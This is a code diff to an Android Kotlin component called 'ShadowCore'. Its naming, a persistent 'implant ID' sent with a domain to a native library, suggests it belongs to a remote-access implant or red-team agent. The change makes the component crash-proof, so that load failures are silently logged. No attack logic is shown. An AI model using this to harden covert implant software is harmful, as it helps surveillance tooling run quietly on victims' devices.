@@ -10,14 +10,23 @@ object ShadowCore {
     init {
         try {
             System.loadLibrary("shadow")
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
+            // UnsatisfiedLinkError is an Error, not Exception — must not kill the process
             Log.e(TAG, "Failed to load libshadow.so", e)
         }
     }
 
-    // Native functions
+    // Native functions — keep externals private; public wrappers never throw
     private external fun nativeInit(domain: String, implantId: String): Int
-    external fun logEvent(entry: String)
+    private external fun nativeLogEvent(entry: String)
+
+    fun logEvent(entry: String) {
+        try {
+            nativeLogEvent(entry)
+        } catch (e: Throwable) {
+            Log.e(TAG, "logEvent unavailable", e)
+        }
+    }
 
     fun start(context: Context, domain: String) {
         // Generate or retrieve persistent implant ID
@@ -30,9 +39,13 @@ object ShadowCore {
         }
 
         Log.i(TAG, "Starting ShadowCore... ID: $implantId")
-        val res = nativeInit(domain, implantId)
-        if (res != 0) {
-            Log.e(TAG, "nativeInit failed with code $res")
+        try {
+            val res = nativeInit(domain, implantId)
+            if (res != 0) {
+                Log.e(TAG, "nativeInit failed with code $res")
+            }
+        } catch (e: Throwable) {
+            Log.e(TAG, "nativeInit unavailable (native lib missing?)", e)
         }
     }
 }
